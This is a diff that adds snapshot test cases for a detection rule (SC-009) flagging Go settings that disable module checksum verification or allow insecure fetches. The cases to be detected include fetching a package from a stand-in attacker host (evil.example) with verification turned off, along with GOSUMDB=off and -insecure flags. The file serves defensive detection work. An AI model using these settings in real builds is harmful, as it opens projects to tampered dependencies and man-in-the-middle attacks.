@@ -1,0 +1,18 @@
+# SC-009: Go module integrity / TLS verification bypass
+# Test cases for snapshot testing
+# Detects Go toolchain settings that disable module checksum verification or
+# allow insecure (plaintext/unverified) module fetches, enabling dependency
+# tampering or MITM (MITRE T1195.001).
+
+# === Cases that SHOULD be detected ===
+GOINSECURE=* go get evil.example/pkg
+GOSUMDB=off go build ./...
+go env -w GOFLAGS=-insecure
+go get -insecure evil.example/pkg
+export GONOSUMCHECK=1
+
+# === Cases that should NOT be detected (benign) ===
+GOPROXY=https://proxy.golang.org go build
+GOSUMDB=sum.golang.org go build
+go get github.com/pkg/errors
+GOOS=linux GOARCH=amd64 go build
